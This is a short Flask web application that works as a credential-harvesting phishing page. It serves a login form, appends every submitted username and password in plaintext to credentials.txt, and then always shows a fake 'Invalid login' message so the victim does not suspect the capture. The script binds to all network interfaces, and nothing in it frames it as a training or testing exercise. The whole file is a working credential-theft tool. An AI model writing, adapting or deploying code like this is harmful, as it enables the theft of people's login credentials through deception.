from flask import Flask, request, render_template

# Initialize Flask app
app = Flask(__name__)

@app.route('/')
def home():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    # Log credentials to a file
    with open('credentials.txt', 'a') as file:
        file.write(f"Username: {username}, Password: {password}\n")
    
    # Simulate a login failure message
    return "<h1>Invalid login. Please try again.</h1>"

# Ensure this script can be run by a WSGI server
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
